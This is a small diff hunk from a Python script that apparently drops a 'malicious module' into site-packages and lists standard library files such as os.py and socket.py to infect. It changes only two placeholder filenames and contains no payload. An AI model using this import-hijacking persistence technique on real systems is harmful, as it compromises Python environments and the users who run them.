@@ -9,8 +9,8 @@ import re
 import site
 import sys
 
-MODULE_CODE = "changeme"           # The malicious module source code file
-DEST_MODULE_NAME = "changeme"       # The name of the module that will get dropped into sitepkg
+MODULE_CODE = "changeme.py"           # The malicious module source code file
+DEST_MODULE_NAME = "changeme.py"       # The name of the module that will get dropped into sitepkg
 #INCLUDE_LIST = ["datetime.py", "io.py", "operator.py", "os.py", "pickle.py", "random.py", "re.py", "socket.py", "stat.py", "string.py", "subprocess.py" ]  # A list of files we will infect
 
 
